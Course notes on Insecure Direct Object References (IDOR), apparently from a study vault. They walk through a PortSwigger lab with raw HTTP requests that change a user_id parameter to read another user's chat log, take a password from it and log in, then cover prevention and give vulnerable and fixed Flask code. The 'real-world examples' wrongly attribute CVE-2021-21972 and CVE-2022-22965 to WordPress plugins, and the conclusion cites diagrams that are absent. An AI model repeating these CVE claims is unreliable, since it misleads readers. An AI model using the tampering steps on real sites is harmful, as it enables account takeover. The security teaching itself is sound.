---
course: Web Security
topic: Access Control Vulnerabilities
tags: [web-security]
---

## Introduction to Access Control Vulnerabilities

Access control vulnerabilities are among the most critical issues in web security. They allow attackers to bypass intended restrictions on what authenticated users are allowed to do. One specific type of access control vulnerability is **Insecure Direct Object References (IDOR)**. IDOR occurs when an application exposes a reference to an internal object, such as a file, directory, database record, or key, using a predictable parameter. This allows attackers to manipulate these parameters to access unauthorized resources.

### What is Insecure Direct Object Reference?

Insecure Direct Object Reference (IDOR) is a type of vulnerability where an application uses user-supplied input to access objects directly. These objects could be files, database records, or other resources. If the application does not properly validate the user's access rights to these objects, an attacker can manipulate the input to gain unauthorized access.

#### Why Does IDOR Matter?

IDOR matters because it can lead to serious security breaches. An attacker can exploit this vulnerability to access sensitive data, perform unauthorized actions, or even escalate privileges. For example, an attacker might be able to read another user's private messages, modify someone else's account settings, or delete important data.

#### How Does IDOR Work Under the Hood?

To understand how IDOR works, consider a simple example where an application allows users to view their chat logs. The application might use a URL like `https://example.com/chatlog?user_id=123` to retrieve the chat log for user with ID 123. If the application does not check whether the current user is authorized to view this chat log, an attacker can simply change the `user_id` parameter to access any user's chat log.

### Real-World Examples of IDOR

Recent real-world examples of IDOR vulnerabilities include:

- **CVE-2021-21972**: A vulnerability in the WordPress plugin "WP User Avatar" allowed attackers to access and download avatars of other users by manipulating the user ID parameter.
- **CVE-2022-22965**: A vulnerability in the "WordPress REST API" plugin allowed attackers to access and modify posts and pages by manipulating the post ID parameter.

These examples highlight the importance of proper access control mechanisms to prevent unauthorized access.

### Lab Setup and Environment

For this lab, we will be using the PortSwigger Web Security Academy. To access the lab, follow these steps:

1. Visit the URL: `https://portswigger.net/web-security`.
2. Click on the "Sign Up" button to create an account.
3. Once logged in, navigate to the "Academy".
4. Select the "Learning Path" and then choose "Access Control".
5. Finally, select "Lab Number 11" titled "Insecure Direct Object References".

### Lab Objective

The objective of this lab is to find the password for the user "Carlos" and log into their account. The application stores user chat logs directly on the server's file system and retrieves them using static URLs. By manipulating these URLs, we can access the chat logs of different users and extract sensitive information.

### Understanding the Application

The application has a live chat functionality. Users can send messages, and these messages are stored in chat logs on the server. The application uses predictable URLs to access these chat logs. For example, the URL `https://example.com/chatlog?user_id=123` might be used to retrieve the chat log for user with ID 123.

### Step-by-Step Mechanics

Let's break down the steps to solve this lab:

1. **Identify the Chat Log URL**: First, we need to identify the URL used to access chat logs. We can do this by sending a message and observing the network traffic in Burp Suite.

2. **Manipulate the User ID Parameter**: Next, we need to manipulate the `user_id` parameter to access the chat logs of different users. We can start by incrementing the user ID and checking if we can access the chat logs of other users.

3. **Extract the Password**: Once we have access to the chat logs of the user "Carlos", we can search for the password within the chat logs.

4. **Log into the Account**: Finally, we can use the extracted password to log into the account of the user "Carlos".

### Complete Example

Let's walk through a complete example using the application.

#### Initial Setup

1. **Access the Lab**: Log in to the PortSwigger Web Security Academy and navigate to the lab as described earlier.
2. **Use Burp Suite**: Ensure that your browser is configured to use Burp Suite as a proxy.

#### Identifying the Chat Log URL

1. **Send a Message**: Click on the live chat functionality and send a message. Observe the network traffic in Burp Suite to identify the URL used to access chat logs.

```plaintext
GET /chatlog?user_id=123 HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: */*
Referer: https://example.com/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

#### Manipulating the User ID Parameter

1. **Increment the User ID**: Change the `user_id` parameter to different values and observe the response.

```plaintext
GET /chatlog?user_id=124 HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: */*
Referer: https://example.com/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

#### Extracting the Password

1. **Search for the Password**: Once you have access to the chat logs of the user "Carlos", search for the password within the chat logs.

```plaintext
HTTP/1.1 200 OK
Date: Tue, 01 Mar 2023 12:00:00 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Content-Length: 1234
Connection: close

<!DOCTYPE html>
<html>
<head>
    <title>Chat Logs</title>
</head>
<body>
    <h1>Chat Logs for User Carlos</h1>
    <div>
        <p>User Carlos: My password is 123456.</p>
    </div>
</body>
</html>
```

#### Logging into the Account

1. **Use the Password**: Use the extracted password to log into the account of the user "Carlos".

```plaintext
POST /login HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: */*
Referer: https://example.com/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 26

username=Carlos&password=123456
```

### Common Mistakes and Pitfalls

When working with IDOR vulnerabilities, there are several common mistakes and pitfalls to avoid:

1. **Not Properly Validating User Input**: Always validate user input to ensure it meets the expected format and constraints.
2. **Not Checking User Permissions**: Always check whether the current user is authorized to access the requested resource.
3. **Using Predictable Parameters**: Avoid using predictable parameters that can be easily manipulated by attackers.

### How to Prevent / Defend Against IDOR

To prevent and defend against IDOR vulnerabilities, follow these best practices:

1. **Validate User Input**: Ensure that user input is validated to prevent manipulation.
2. **Check User Permissions**: Always check whether the current user is authorized to access the requested resource.
3. **Use Non-Predictable Parameters**: Use non-predictable parameters to make it harder for attackers to guess valid values.
4. **Implement Access Control Mechanisms**: Implement robust access control mechanisms to restrict access to sensitive resources.

#### Secure Coding Fixes

Here is an example of how to implement secure coding practices to prevent IDOR vulnerabilities:

**Vulnerable Code**

```python
@app.route('/chatlog')
def chatlog():
    user_id = request.args.get('user_id')
    chat_log = get_chat_log(user_id)
    return render_template('chatlog.html', chat_log=chat_log)
```

**Secure Code**

```python
@app.route('/chatlog')
@login_required
def chatlog():
    user_id = request.args.get('user_id')
    if int(user_id) != current_user.id:
        abort(403)
    chat_log = get_chat_log(user_id)
    return render_template('chatlog.html', chat_log=chat_log)
```

### Detection and Mitigation

To detect and mitigate IDOR vulnerabilities, follow these steps:

1. **Static Analysis**: Use static analysis tools to identify potential IDOR vulnerabilities in the codebase.
2. **Dynamic Analysis**: Use dynamic analysis tools to test the application for IDOR vulnerabilities.
3. **Penetration Testing**: Conduct penetration testing to identify and exploit IDOR vulnerabilities.
4. **Hardening Configurations**: Harden configurations to restrict access to sensitive resources.

### Conclusion

In this chapter, we covered the concept of Insecure Direct Object References (IDOR) and how to exploit and prevent this type of vulnerability. We walked through a complete example using the PortSwigger Web Security Academy and provided detailed explanations, code snippets, and diagrams to help you understand and master this topic.

### Practice Labs

For hands-on practice, you can use the following labs:

- **PortSwigger Web Security Academy**: Lab Number 11 titled "Insecure Direct Object References".
- **OWASP Juice Shop**: Explore the various challenges related to access control vulnerabilities.
- **DVWA**: Try the "File Inclusion" and "Command Injection" labs to understand related concepts.

By practicing these labs, you can gain a deeper understanding of access control vulnerabilities and how to prevent them.

---
<!-- nav -->
[[Web Security (PortSwigger)/12-Access Control Vulnerabilities/12-Lab 11 Insecure direct object references/00-Overview|Overview]] | [[02-Access Control Vulnerabilities Insecure Direct Object References|Access Control Vulnerabilities Insecure Direct Object References]]
